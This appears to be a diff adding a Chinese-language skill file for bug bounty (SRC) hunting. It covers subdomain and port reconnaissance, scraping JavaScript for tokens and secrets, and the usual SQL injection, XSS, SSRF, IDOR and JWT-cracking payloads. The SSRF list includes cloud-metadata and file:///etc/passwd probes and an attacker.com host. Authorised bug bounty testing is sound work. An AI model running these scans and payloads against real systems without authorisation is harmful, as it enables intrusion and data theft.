@@ -1,0 +1,192 @@
+---
+name: src专项挖掘
+description: Use when encountering 漏洞赏金平台专项挖掘 - 资产收集、漏洞发现、自动化扫描、报告撰写
+---
+
+# SRC专项挖掘
+
+## Info
+
+- **Domain**: src
+- **Tags**: src, bugbounty, recon, automation
+
+## 资产收集
+
+### 1. 主域名发现
+```bash
+# 子域名枚举
+subfinder -d target.com -o subs.txt
+sublist3r -d target.com -o subs.txt
+amass enum -d target.com -o subs.txt
+
+# 证书透明度
+curl -s "https://crt.sh/?q=%.target.com&output=json" | jq -r '.[].name_value'
+
+# DNS爆破
+dnsrecon -d target.com -D wordlist.txt -t brt
+```
+
+### 2. 端口扫描
+```bash
+# 快速扫描
+masscan -p 1-65535 -iL ips.txt --rate=1000 -oL ports.txt
+
+# 详细服务识别
+nmap -sV -sC -p- -iL ips.txt -oA scan
+```
+
+### 3. 目录扫描
+```bash
+# dirsearch
+dirsearch -u https://target.com -e php,asp,jsp,html,js -t 50
+
+# ffuf
+ffuf -u https://target.com/FUZZ -w wordlist.txt -mc 200,301,302
+
+# gobuster
+gobuster dir -u https://target.com -w wordlist.txt -t 50
+```
+
+### 4. JS发现
+```bash
+# JS文件收集
+gau -subs target.com | grep -E "\.js$"
+katana -u https://target.com -js-crawl
+
+# 敏感信息提取
+cat js_files.txt | xargs -I{} curl -s {} | grep -iE "api|token|key|secret|password"
+```
+
+## 漏洞发现
+
+### 高危漏洞类型
+
+#### SQL注入
+```bash
+# 手工测试点
+' " ) ')) -- - #
+1' AND 1=1-- -
+1' AND 1=2-- -
+
+# sqlmap自动化
+sqlmap -u "https://target.com/api?id=1" --batch --level=3
+```
+
+#### XSS
+```html
+# 反射型
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+"><script>alert(1)</script>
+
+# 存储型
+"><img src=x onerror=alert(document.domain)>
+
+# DOM型
+#<script>alert(1)</script>
+javascript:alert(1)
+```
+
+#### SSRF
+```bash
+# 内网探测
+http://127.0.0.1/admin
+http://192.168.1.1/
+http://[::1]/
+
+# 云元数据
+http://169.254.169.254/latest/meta-data/
+
+# DNS Rebinding
+http://attacker.com/
+file:///etc/passwd
+```
+
+#### IDOR
+```bash
+# 用户ID遍历
+/api/user/1 -> /api/user/2
+/api/profile?id=1 -> /api/profile?id=2
+
+# 订单ID遍历
+/order/12345 -> /order/12346
+```
+
+#### 认证绕过
+```bash
+# JWT弱密钥
+jwt_tool.py <token> -C -d wordlist.txt
+
+# 密码重置漏洞
+- 修改响应包
+- Token可预测
+- Token复用
+```
+
+## 自动化工具
+
+### Nuclei
+```bash
+# CVE扫描
+nuclei -l urls.txt -t cves/ -severity critical,high
+
+# 暴露信息
+nuclei -l urls.txt -t exposures/
+
+# 自定义模板
+nuclei -l urls.txt -t custom-templates/
+```
+
+### 自定义POC
+```yaml
+id: custom-vuln
+info:
+  name: Custom Vulnerability
+  severity: high
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/vulnerable/path"
+    matchers:
+      - type: word
+        words:
+          - "vulnerable response"
+```
+
+## 报告撰写
+
+### 报告结构
+```
+1. 漏洞标题
+2. 漏洞等级
+3. 漏洞描述
+4. 复现步骤
+5. 漏洞证明(截图/视频)
+6. 修复建议
+7. 影响范围
+```
+
+### 漏洞等级评估
+```
+严重: RCE、SQL注入(可获取大量数据)
+高危: SQL注入、任意文件读取、SSRF内网访问
+中危: XSS、CSRF、IDOR(敏感数据)
+低危: 信息泄露、URL跳转
+```
+
+## 收益优化
+
+### 高价值目标
+- 登录/注册接口
+- 支付/充值功能
+- 用户中心/个人资料
+- 文件上传/导入
+- API接口
+
+### 挖掘技巧
+1. 关注业务逻辑漏洞
+2. 测试边界条件
+3. 尝试越权访问
+4. 分析JS接口
+5. 关注历史漏洞
